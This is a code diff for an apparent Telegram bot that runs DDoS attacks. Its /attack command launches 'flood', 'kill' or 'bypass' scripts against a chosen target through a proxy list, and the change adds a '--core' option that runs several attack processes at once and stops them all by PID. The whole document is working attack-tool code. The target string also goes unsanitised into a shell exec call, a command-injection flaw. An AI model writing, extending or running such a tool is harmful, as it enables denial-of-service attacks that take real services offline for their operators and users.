@@ -23,7 +23,7 @@ bot.onText(/\/system/, async (msg) => {
     return;
   }
   try {
-    const data = await si.getAllData();
+    const data = await si.get();
     bot.sendMessage(msg.chat.id, JSON.stringify(data, null, 2));
   } catch (e) {
     bot.sendMessage(msg.chat.id, 'Error fetching system info');
@@ -36,18 +36,33 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
     return;
   }
   const params = match[1].split(' ');
-  const method = params[0] && ['flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'flood';
-  const target = params[1] || params[0];
-  const time = parseInt(params[2] || params[1]);
+  let method, target, time, core = 4;
+
+  if (params.includes('--core')) {
+    const coreIndex = params.indexOf('--core');
+    core = parseInt(params[coreIndex + 1]) || 4;
+    params.splice(coreIndex, 2);
+  }
+
+  if (['flood', 'kill', 'bypass'].includes(params[0])) {
+    method = params[0];
+    target = params[1];
+    time = parseInt(params[2]);
+  } else {
+    method = 'flood';
+    target = params[0];
+    time = parseInt(params[1]);
+  }
+
   const rate = 25;
   const threads = 10;
   const proxyfile = './prx.txt';
-  
+
   if (!target || !time) {
-    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]');
+    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time] [--core <number>]');
     return;
   }
-  
+
   const attackId = Date.now();
   const attackData = {
     id: attackId,
@@ -57,30 +72,34 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
     threads,
     proxyfile,
     status: 'started',
-    messageId: null
+    messageId: null,
+    pids: []
   };
-  
-  const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
-    if (err) {
-      bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}`);
-      attacks = attacks.filter(a => a.id !== attackId);
-      return;
-    }
-  });
-  
-  attackData.pid = child.pid;
+
+  for (let i = 0; i < core; i++) {
+    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
+      if (err) {
+        bot.sendMessage(msg.chat.id, `Attack ${attackId} failed: ${err.message}`);
+        attacks = attacks.filter(a => a.id !== attackId);
+        return;
+      }
+    });
+    attackData.pids.push(child.pid);
+  }
+
   attacks.push(attackData);
-  
+
   bot.sendMessage(msg.chat.id, JSON.stringify({
     status: attackData.status,
     target,
     time,
     rate,
     threads,
-    proxyfile
+    proxyfile,
+    cores: core
   }, null, 2)).then(sentMsg => {
     attackData.messageId = sentMsg.message_id;
-    
+
     setTimeout(() => {
       attackData.status = 'running';
       let remainingTime = time;
@@ -98,7 +117,8 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
           time: remainingTime,
           rate,
           threads,
-          proxyfile
+          proxyfile,
+          cores: core
         }, null, 2), {
           chat_id: msg.chat.id,
           message_id: attackData.messageId
@@ -109,7 +129,7 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
       }, 5000);
     }, 5000);
   });
-  
+
   bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`);
 });
 
@@ -122,7 +142,7 @@ bot.onText(/\/list/, (msg) => {
     bot.sendMessage(msg.chat.id, 'No active attacks');
     return;
   }
-  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s`).join('\n');
+  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s, Cores: ${a.pids.length}`).join('\n');
   bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`);
 });
 
@@ -139,7 +159,7 @@ bot.onText(/\/stop (.+)/, (msg, match) => {
   }
   attacks = attacks.filter(a => a.id !== attackId);
   try {
-    process.kill(attack.pid);
+    attack.pids.forEach(pid => process.kill(pid));
     bot.deleteMessage(msg.chat.id, attack.messageId);
     bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`);
   } catch (e) {
